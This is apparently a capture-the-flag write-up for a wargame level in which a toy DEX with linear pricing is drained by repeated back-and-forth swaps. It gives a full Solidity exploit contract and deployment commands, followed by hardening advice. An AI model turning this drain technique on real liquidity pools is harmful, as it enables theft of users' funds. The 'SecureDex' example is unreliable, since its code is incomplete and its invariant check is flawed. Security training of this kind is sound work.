# Level 22: Dex Challenge

## Challenge Description

The goal of this level is for you to hack the basic DEX contract below and steal the funds by price manipulation.

You will start with 10 tokens of token1 and 10 of token2. The DEX contract starts with 100 of each token.

You will be successful in this level if you manage to drain all of at least 1 of the 2 tokens from the contract, and allow the contract to report a "bad" price of the assets.

**Things that might help:**
- How is the price of the token calculated?
- How does the swap method work?
- How do you approve a transaction of an ERC20?
- There's more than one way to interact with a contract!

## Contract Location

The challenge contract is located at:
```
/contracts/level-22-dex/Dex.sol
```

## Understanding the Challenge

The `Dex` contract is a simple decentralized exchange (DEX) with a flawed price calculation mechanism:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract Dex is Ownable {
    address public token1;
    address public token2;

    function swap(address from, address to, uint256 amount) public {
        require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
        require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
        uint256 swapAmount = getSwapPrice(from, to, amount);
        IERC20(from).transferFrom(msg.sender, address(this), amount);
        IERC20(to).approve(address(this), swapAmount);
        IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
    }

    function getSwapPrice(address from, address to, uint256 amount) public view returns (uint256) {
        return ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));
    }
}
```

### Key Observations

1. **Starting balances:**
   - Player: 10 token1, 10 token2
   - DEX: 100 token1, 100 token2

2. **The price formula:**
   ```solidity
   swapAmount = (amount * toBalance) / fromBalance
   ```
   This is a simple ratio-based pricing without any slippage protection or proper AMM formula.

3. **The vulnerability:**
   - Each swap changes the token ratio in the DEX
   - The price formula doesn't account for this ratio change properly
   - By repeatedly swapping back and forth, we can manipulate the price
   - Eventually, we can drain all of one token

4. **Goal:**
   - Drain all of at least one token from the DEX (bring balance to 0)

## The Vulnerability: Flawed Price Formula

### Why the Formula is Broken

The DEX uses a simple linear pricing formula:
```
output = (input × outputBalance) / inputBalance
```

This differs from proper Automated Market Maker (AMM) formulas like Uniswap's constant product formula:
```
x × y = k (constant)
```

**The problem with the linear formula:**
1. It doesn't maintain a constant product
2. Each swap dramatically shifts the ratio
3. Larger swaps become increasingly favorable
4. No slippage protection
5. Allows complete drainage of reserves

### Price Manipulation Through Repeated Swaps

Let's trace through the swap sequence to see how the price gets manipulated:

```
Initial State:
  Player: (10 token1, 10 token2)
  DEX:    (100 token1, 100 token2)
  Ratio: 1:1

Swap 1: Give 10 token1, get token2
  Calculate: (10 × 100) / 100 = 10 token2
  Result: Player: (0, 20)  DEX: (110, 90)
  Ratio: 1.22:1 (token1 is now "cheaper")

Swap 2: Give 20 token2, get token1
  Calculate: (20 × 110) / 90 = 24.44... = 24 token1 (integer division)
  Result: Player: (24, 0)  DEX: (86, 110)
  Ratio: 0.78:1 (token2 is now "cheaper")

Swap 3: Give 24 token1, get token2
  Calculate: (24 × 110) / 86 = 30.69... = 30 token2
  Result: Player: (0, 30)  DEX: (110, 80)
  Ratio: 1.375:1

Swap 4: Give 30 token2, get token1
  Calculate: (30 × 110) / 80 = 41.25 = 41 token1
  Result: Player: (41, 0)  DEX: (69, 110)
  Ratio: 0.627:1

Swap 5: Give 41 token1, get token2
  Calculate: (41 × 110) / 69 = 65.36... = 65 token2
  Result: Player: (0, 65)  DEX: (110, 45)
  Ratio: 2.44:1

Swap 6: Give 45 token2, get token1 (FINAL DRAIN!)
  Calculate: (45 × 110) / 45 = 110 token1
  Result: Player: (110, 20)  DEX: (0, 90)
  ✅ SUCCESS! Token1 completely drained!
```

### Visual Representation

```
           Swap 1      Swap 2      Swap 3      Swap 4      Swap 5      Swap 6
Player:    10,10  →    0,20   →   24,0   →    0,30   →   41,0   →    0,65   →   110,20
DEX:      100,100 →  110,90  →   86,110  →  110,80  →   69,110  →  110,45  →     0,90

Price Ratio (token1:token2):
          1.00    →   1.22   →   0.78   →   1.38   →   0.63   →   2.44   →   DRAINED
```

Notice how the ratio swings more dramatically with each swap, and we gain more tokens each time!

## Winning Strategy

The attack is straightforward once you understand the vulnerability:

1. **Approve the DEX** to spend your tokens
2. **Swap all token1 for token2**
3. **Swap all token2 for token1** (you now have more than you started with!)
4. **Repeat steps 2-3** several times
5. **On the final swap**, calculate the exact amount needed to drain all remaining tokens
6. **Execute the final swap** to completely drain one token

### Key Insight

Each swap makes the token you're selling "more expensive" in the DEX, so when you swap back, you get even more tokens. This positive feedback loop allows you to drain the reserves.

## Hint for Thinking

Ask yourself:
* What happens to the ratio after each swap?
* How much do you get back when you swap tokens?
* Do you get more tokens back than you put in?
* What happens if you keep swapping back and forth?
* How can you calculate the exact amount for the final drain?

## Disclaimer

If you want to solve this challenge on your own, stop reading here and try to implement a solution based on the hints above. The complete solution is provided below.

---

## Solution

### The Attack Vector

Our solution performs a series of swaps to manipulate the price and drain the DEX:

1. Deploy a contract that can interact with the DEX
2. Approve the DEX to spend our tokens
3. Perform a series of swaps (5-6 swaps total)
4. Calculate the exact amount for the final drain
5. Execute the final swap to drain all of one token

### Complete Exploit Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IDex {
    function token1() external view returns (address);
    function token2() external view returns (address);
    function swap(address from, address to, uint256 amount) external;
    function approve(address spender, uint256 amount) external;
    function balanceOf(address token, address account) external view returns (uint256);
    function getSwapPrice(address from, address to, uint256 amount) external view returns (uint256);
}

contract DexExploit {
    address public dex;
    address public token1;
    address public token2;
    address public owner;

    constructor(address _dex) {
        dex = _dex;
        owner = msg.sender;
        token1 = IDex(dex).token1();
        token2 = IDex(dex).token2();
    }

    function exploit() external {
        require(msg.sender == owner, "Not the owner");
        
        // Approve the DEX to spend our tokens
        IERC20(token1).approve(dex, type(uint256).max);
        IERC20(token2).approve(dex, type(uint256).max);
        
        // Perform the swap sequence
        // Swap 1: All token1 -> token2
        swapAll(token1, token2);
        
        // Swap 2: All token2 -> token1
        swapAll(token2, token1);
        
        // Swap 3: All token1 -> token2
        swapAll(token1, token2);
        
        // Swap 4: All token2 -> token1
        swapAll(token2, token1);
        
        // Swap 5: All token1 -> token2
        swapAll(token1, token2);
        
        // Swap 6: Final drain - swap exact amount to drain token1
        uint256 dexToken1Balance = IERC20(token1).balanceOf(dex);
        uint256 dexToken2Balance = IERC20(token2).balanceOf(dex);
        
        // Calculate exact amount needed to drain token1
        uint256 amountToSwap = dexToken2Balance;
        
        IDex(dex).swap(token2, token1, amountToSwap);
    }

    function swapAll(address from, address to) internal {
        uint256 balance = IERC20(from).balanceOf(address(this));
        IDex(dex).swap(from, to, balance);
    }
}
```

### How It Works - Step by Step

1. **Contract Deployment:**
   ```typescript
   // Deploy the exploit contract with the DEX address
   const dexExploit = await deploy("DexExploit", [dexAddress]);
   
   // Transfer initial tokens (10 of each)
   await token1.transfer(dexExploit.address, parseEther("10"));
   await token2.transfer(dexExploit.address, parseEther("10"));
   ```

2. **Execute the exploit:**
   ```typescript
   await dexExploit.exploit();
   ```

3. **The contract automatically:**
   - Approves the DEX to spend tokens
   - Swaps all token1 for token2 (5 times alternating)
   - Calculates the exact amount for the final drain
   - Executes the final swap to drain all token1

### Mathematical Breakdown

The key is understanding the integer division and how ratios change:

```javascript
// Formula: output = (input × outputBalance) / inputBalance

// After 5 swaps, we have:
// Player: 65 token2
// DEX: 110 token1, 45 token2

// For final swap, we want ALL 110 token1
// We need: (x × 110) / 45 = 110
// Solving: x = 45

// So swap exactly 45 token2 to get all 110 token1!
```

### Execution Steps

1. **Deploy the Dex Contract:**
   ```shell
   npx hardhat deploy --tags dex --network sepolia
   ```

2. **Deploy the DexExploit Contract:**
   ```shell
   TARGET_ADDRESS=0xYourDexAddress npx hardhat deploy --tags dex-solution --network sepolia
   ```

3. **Execute the exploit:**
   ```shell
   DEX_EXPLOIT_ADDRESS=0xYourExploitAddress TARGET_ADDRESS=0xYourDexAddress npx hardhat run scripts/level-22-dex/execute-dex-exploit.ts --network sepolia
   ```

## Key Takeaways

### 1. Proper AMM Formulas Are Critical

The flawed DEX uses a simple linear formula:
```
output = (input × outputBalance) / inputBalance
```

A proper AMM (like Uniswap V2) uses the constant product formula:
```
x × y = k (constant)
output = y - (k / (x + input))
```

This ensures:
- The product remains constant
- Larger trades have exponentially more slippage
- Impossible to completely drain reserves
- Price impact is proportional to trade size

### 2. Slippage Protection

The DEX has no slippage protection. A secure implementation should include:

```solidity
function swap(
    address from, 
    address to, 
    uint256 amountIn, 
    uint256 minAmountOut  // Slippage protection
) public {
    uint256 amountOut = getSwapPrice(from, to, amountIn);
    require(amountOut >= minAmountOut, "Slippage too high");
    // ... rest of swap logic
}
```

### 3. Reserve Limits

Proper DEXes maintain minimum reserves:

```solidity
uint256 constant MINIMUM_LIQUIDITY = 1000;

function swap(address from, address to, uint256 amount) public {
    uint256 swapAmount = getSwapPrice(from, to, amount);
    require(
        IERC20(to).balanceOf(address(this)) - swapAmount >= MINIMUM_LIQUIDITY,
        "Insufficient reserves"
    );
    // ... rest of swap logic
}
```

### 4. Price Oracle Integration

For critical systems, use external price oracles to validate prices:

```solidity
function swap(address from, address to, uint256 amount) public {
    uint256 internalPrice = getSwapPrice(from, to, amount);
    uint256 oraclePrice = priceOracle.getPrice(from, to, amount);
    
    // Ensure internal price is within acceptable range of oracle price
    require(
        internalPrice >= oraclePrice * 95 / 100 &&
        internalPrice <= oraclePrice * 105 / 100,
        "Price deviation too high"
    );
    // ... rest of swap logic
}
```

### 5. Reentrancy Protection

Always use reentrancy guards for financial operations:

```solidity
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract Dex is Ownable, ReentrancyGuard {
    function swap(address from, address to, uint256 amount) 
        public 
        nonReentrant  // Prevent reentrancy
    {
        // ... swap logic
    }
}
```

## Comparison: Vulnerable vs. Secure DEX

### Vulnerable Implementation (Current)

```solidity
function getSwapPrice(address from, address to, uint256 amount) 
    public 
    view 
    returns (uint256) 
{
    return ((amount * IERC20(to).balanceOf(address(this))) 
            / IERC20(from).balanceOf(address(this)));
}

function swap(address from, address to, uint256 amount) public {
    uint256 swapAmount = getSwapPrice(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
}
```

**Issues:**
- ❌ Linear pricing (easily manipulated)
- ❌ No slippage protection
- ❌ No minimum reserves
- ❌ No reentrancy guard
- ❌ Can be completely drained

### Secure Implementation (Uniswap-like)

```solidity
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract SecureDex is ReentrancyGuard {
    uint256 private reserve0;
    uint256 private reserve1;
    uint256 private constant MINIMUM_LIQUIDITY = 1000;
    
    function swap(
        address tokenIn,
        address tokenOut,
        uint256 amountIn,
        uint256 minAmountOut
    ) external nonReentrant returns (uint256 amountOut) {
        // Use constant product formula
        uint256 balance0 = IERC20(token0).balanceOf(address(this));
        uint256 balance1 = IERC20(token1).balanceOf(address(this));
        
        bool isToken0 = tokenIn == token0;
        (uint256 reserveIn, uint256 reserveOut) = isToken0 
            ? (reserve0, reserve1) 
            : (reserve1, reserve0);
        
        // Calculate output with 0.3% fee
        uint256 amountInWithFee = amountIn * 997;
        amountOut = (amountInWithFee * reserveOut) 
                  / (reserveIn * 1000 + amountInWithFee);
        
        // Slippage protection
        require(amountOut >= minAmountOut, "Insufficient output");
        
        // Reserve protection
        require(reserveOut - amountOut >= MINIMUM_LIQUIDITY, "Insufficient liquidity");
        
        // Transfer tokens
        IERC20(tokenIn).transferFrom(msg.sender, address(this), amountIn);
        IERC20(tokenOut).transfer(msg.sender, amountOut);
        
        // Update reserves
        _update(
            IERC20(token0).balanceOf(address(this)),
            IERC20(token1).balanceOf(address(this))
        );
        
        // Verify K didn't decrease
        require(reserve0 * reserve1 >= balance0 * balance1, "K decreased");
    }
    
    function _update(uint256 balance0, uint256 balance1) private {
        reserve0 = balance0;
        reserve1 = balance1;
    }
}
```

**Improvements:**
- ✅ Constant product formula (x × y = k)
- ✅ Slippage protection (minAmountOut)
- ✅ Minimum liquidity reserves
- ✅ Reentrancy guard
- ✅ Trading fees (0.3%)
- ✅ K verification
- ✅ Cannot be drained

## Real-World Implications

This vulnerability pattern has real consequences:

### 1. Flash Loan Attacks

Many DeFi exploits use similar price manipulation:
- Harvest Finance (2020): $34M stolen via price manipulation
- PancakeBunny (2021): $200M lost to flash loan price manipulation
- Cream Finance (2021): $130M stolen via price oracle manipulation

### 2. Sandwich Attacks

MEV bots exploit simple AMM formulas:
1. See user's large trade in mempool
2. Front-run with similar trade (raising price)
3. User's trade executes at bad price
4. Back-run to sell at profit

### 3. Arbitrage Exploitation

Simple price formulas create arbitrage opportunities:
- Attackers can drain liquidity pools
- Legitimate users get bad prices
- Pool becomes unusable

## The Lesson

**Key Takeaways:**

1. **Never use linear price formulas** - Always use proper AMM formulas like constant product (x × y = k)

2. **Implement slippage protection** - Users should specify minimum acceptable output

3. **Maintain reserve limits** - Never allow complete drainage of reserves

4. **Add trading fees** - Fees discourage manipulation and reward liquidity providers

5. **Use reentrancy guards** - Protect all state-changing functions

6. **Test with adversarial scenarios** - Simulate repeated swaps to find manipulation paths

7. **Consider oracle integration** - External price feeds can detect manipulation

8. **Monitor for unusual activity** - Large price movements should trigger alerts

## Additional Resources

### Uniswap V2 Formula

```
Constant Product: x × y = k

Where:
- x = reserve of token0
- y = reserve of token1  
- k = constant (maintained across swaps)

For a swap:
- Input: Δx
- Output: Δy = y - (k / (x + Δx))
- With fee: Δy = y - (k / (x + Δx × 0.997))
```

### Calculating Swap Output

```javascript
// Constant product formula with fee
function getAmountOut(amountIn, reserveIn, reserveOut) {
    const amountInWithFee = amountIn * 997;
    const numerator = amountInWithFee * reserveOut;
    const denominator = reserveIn * 1000 + amountInWithFee;
    return numerator / denominator;
}

// Example:
// Swap 10 token1 when reserves are (100, 100)
getAmountOut(10, 100, 100);
// Returns: 9.066 token2 (vs 10 in vulnerable DEX)

// The difference is the slippage + fee
// Multiple swaps have exponentially more slippage
```

### Testing Your DEX

```javascript
// Test for manipulation vulnerability
it("should not allow draining reserves", async () => {
    // Give attacker some tokens
    await token1.transfer(attacker.address, parseEther("10"));
    await token2.transfer(attacker.address, parseEther("10"));
    
    // Try to drain by swapping back and forth
    for (let i = 0; i < 10; i++) {
        // Swap all token1 for token2
        let balance1 = await token1.balanceOf(attacker.address);
        if (balance1 > 0) {
            await dex.connect(attacker).swap(token1.address, token2.address, balance1);
        }
        
        // Swap all token2 for token1
        let balance2 = await token2.balanceOf(attacker.address);
        if (balance2 > 0) {
            await dex.connect(attacker).swap(token2.address, token1.address, balance2);
        }
    }
    
    // Check DEX still has reserves
    const dexBalance1 = await token1.balanceOf(dex.address);
    const dexBalance2 = await token2.balanceOf(dex.address);
    
    expect(dexBalance1).to.be.gt(MINIMUM_LIQUIDITY);
    expect(dexBalance2).to.be.gt(MINIMUM_LIQUIDITY);
});
```

## Conclusion

The Dex challenge teaches us that:

1. **Simple formulas are dangerous** - Linear pricing can be easily manipulated
2. **AMM math is critical** - Proper formulas like x × y = k prevent drainage
3. **Slippage protection is essential** - Users need to specify acceptable price ranges
4. **Testing is crucial** - Always test with adversarial scenarios
5. **Learn from DeFi** - Study production DEXes like Uniswap for best practices

This vulnerability demonstrates why DeFi protocols must use battle-tested AMM formulas and why security audits are critical for financial smart contracts. The difference between a linear formula and a constant product formula is the difference between a secure DEX and one that can be drained in seconds!
